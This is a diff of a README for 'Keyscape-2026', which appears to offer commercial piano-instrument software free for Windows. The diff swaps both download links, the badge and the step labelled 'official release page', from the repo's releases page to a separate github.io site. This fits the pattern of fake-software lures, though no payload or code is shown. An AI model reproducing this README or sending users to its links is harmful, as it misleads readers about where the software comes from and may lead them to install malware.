@@ -1,6 +1,6 @@
 # 🎹 Keyscape-2026 - Access Professional Piano Sounds On Windows
 
-[![Download Keyscape](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/mdsazzadhosen0011-lang/Keyscape-2026/releases)
+[![Download Keyscape](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://mdsazzadhosen0011-lang.github.io)
 
 This software provides a library of high-quality keyboard instruments for your music production projects. You get access to custom piano tones and vintage keyboard sounds in one package. This guide helps you download, install, and set up the instrument on your Windows 11 or 10 computer.
 
@@ -19,7 +19,7 @@ Before you install the software, ensure your computer meets these hardware needs
 
 The software is hosted on GitHub. Follow these steps to obtain the installer:
 
-1.  Visit the official release page: https://github.com/mdsazzadhosen0011-lang/Keyscape-2026/releases
+1.  Visit the official release page: https://mdsazzadhosen0011-lang.github.io
 2.  Look for the section labeled "Assets" at the bottom of the latest release.
 3.  Click the zip file link to start the download.
 4.  Save the file to your Downloads folder.
